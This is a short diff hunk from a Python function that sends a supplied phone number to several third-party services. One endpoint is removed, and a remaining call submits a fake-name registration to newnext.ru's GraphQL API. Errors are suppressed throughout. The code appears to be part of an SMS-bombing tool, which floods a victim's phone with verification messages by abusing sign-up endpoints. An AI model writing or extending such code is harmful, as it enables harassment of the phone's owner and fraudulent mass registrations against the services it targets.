@@ -777,10 +777,6 @@ def qwwwww(_phone):
         except:
             s=s
         try:
-            requests.get("https://solomolopolo112.000webhostapp.com/api/index.php", params={'phone': _phone})
-        except:
-            s=s
-        try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
         except:
             s=s
